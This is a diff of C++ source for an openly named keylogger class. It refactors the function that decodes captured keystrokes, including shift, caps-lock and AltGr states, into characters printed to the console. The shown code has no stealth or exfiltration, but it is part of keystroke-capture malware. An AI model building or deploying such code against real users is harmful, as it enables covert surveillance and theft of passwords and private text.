@@ -1,4 +1,4 @@
-#include "keylogger.h"
+﻿#include "keylogger.h"
 
 Keylogger::Keylogger() 
 	: keylog(nullptr) 
@@ -32,8 +32,8 @@ void Keylogger::setKeysState() {
 	}
 }
 void Keylogger::handleOutput() {
-	const auto& layout = getLayout();
 	const auto& keys = getKeys();
+	const auto& layout = getLayout();
 	const auto& keysLayout = getKeysLayout();
 
 	const bool shift = keys[VK_SHIFT].isPressed();
@@ -54,18 +54,18 @@ void Keylogger::handleOutput() {
 			continue;
 		}
 
+		const auto& attributes = keyLayout.Attributes;
 		const bool upper{
-			(((keyLayout.Attributes == CAPLOK) && !altgr) ||
-			((keyLayout.Attributes == CAPLOKALTGR && altgr))) ?
-			(shift != caps) :
+			attributes & CAPLOK && !altgr || attributes & CAPLOKALTGR && altgr ?
+			shift != caps :
 			shift
 		};
 			
-		const BYTE mod = layout.pCharModifiers->ModNumber[
+		const BYTE index = layout.pCharModifiers->ModNumber[
 			(upper ? KBDSHIFT : 0) | (ctrl ? KBDCTRL : 0) | (alt ? KBDALT : 0)
 		];
 
-		std::wcout << keyLayout.wch[mod];
+		std::wcout << keyLayout.wch[index];
 
 		std::wcout.clear();
 	}
